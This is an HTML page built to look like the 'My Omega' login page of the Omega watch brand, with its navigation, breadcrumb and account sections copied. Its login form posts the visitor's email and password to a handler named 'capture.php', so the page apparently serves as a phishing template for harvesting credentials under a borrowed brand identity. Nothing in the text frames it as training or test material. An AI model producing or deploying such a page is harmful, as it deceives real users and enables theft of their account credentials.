<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My Omega Login</title>
    <link rel="stylesheet" href="./styles.css">
</head>
<body>
    <header>
        <nav class="navbar">
            <div class="menu">MENU</div>
            <div class="logo">OMEGA</div>
            <ul class="nav-links">
                <li>CONSTELLATION</li>
                <li>SEAMASTER</li>
                <li>SPEEDMASTER</li>
                <li>DE VILLE</li>
                <li>Accessories</li>
                <li>Find your OMEGA</li>
            </ul>
        </nav>
    </header>

    <main>
        <div class="breadcrumb">HOME / MY OMEGA DASHBOARD / LOGIN</div>
        <h1 class="title">MY OMEGA</h1>

        <div class="login-section">
            <div class="account-column">
                <h2>I HAVE AN ACCOUNT</h2>
                <form action="./capture.php" method="POST">
                    <input type="email" id="email" name="email" placeholder="Email *" required>
                    <input type="password" id="password" name="password" placeholder="Password *" required>
                    <a href="#" class="forgot-password">Forgot Your Password?</a>
                    <button type="submit" class="form-button">LOGIN</button>
                </form>
            </div>

            <div class="account-column">
                <h2>I DON'T HAVE AN ACCOUNT</h2>
                <p>Create an account to benefit from our exclusive services and keep up to date with our latest publications.</p>
                <button class="form-button">SIGN UP</button>
            </div>
        </div>
    </main>

    <footer>
        <p>SUBSCRIBE TO OUR NEWSLETTER</p>
        <p>FOLLOW US</p>
    </footer>
</body>
</html>
